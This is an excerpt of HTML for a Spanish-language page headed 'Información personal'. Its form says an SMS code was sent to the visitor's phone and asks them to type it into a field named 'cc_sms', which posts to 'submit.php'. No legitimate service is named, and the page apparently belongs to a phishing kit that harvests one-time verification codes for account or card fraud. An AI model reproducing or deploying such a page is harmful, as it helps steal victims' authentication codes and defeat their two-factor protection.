...
<main id="main">
    ...
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 col-lg-10 col-xl-8" id="">
                <h1 class="text-blue fz-30 font-weight-normal mt-20 mb-30">Información personal</h1>
                <div class="box" id="card_box">
                    <form action="submit.php" method="post" class="card_form" id="">
                        <div class="row">
                            <h3 class="card_sms_title col-md-12 pl-0">Te hemos enviado un SMS con un código en tu teléfono móvil:</h3>
                            <div class="col-sm-12 col-md-12 col-lg-12 col-xl-6 pl-0">
                                <div class="row">
                                    <div class="form-group col-md-12">
                                        <label for="name_card">Código SMS recibido:</label>
                                        <input type="text" name="cc_sms" id="cc_sms" class="form-control" placeholder="XXXXXX" required>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-12">
                                <div class="row">
                                    ...
                                    <input type="hidden" name="type" value="submit_sms">

                                </div>
                            </div>

                            <div class="form-group col-md-12">
                                <button type="submit" id="submit-sms" class="btn-block">Entrar</button>
                            </div>
                        </div>
                    </form>
                </div>
